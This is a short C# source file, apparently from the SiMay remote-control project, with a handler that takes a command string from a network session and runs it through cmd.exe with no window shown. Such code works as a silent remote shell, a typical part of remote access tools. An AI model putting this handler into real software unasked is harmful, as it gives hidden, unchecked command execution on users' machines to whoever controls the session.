using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SiMay.Service.Core
{
    public class ShellSimpleService : RemoteSimpleServiceBase
    {
        [PacketHandler(MessageHead.S_SIMPLE_EXE_SHELL)]
        public void ExecuteShell(SessionProviderContext session)
        {
            var cmd = session.GetMessage().ToUnicodeString();
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = cmd;
            p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
            p.StartInfo.CreateNoWindow = true;//不显示程序窗口
            p.Start();//启动程序
        }
    }
}
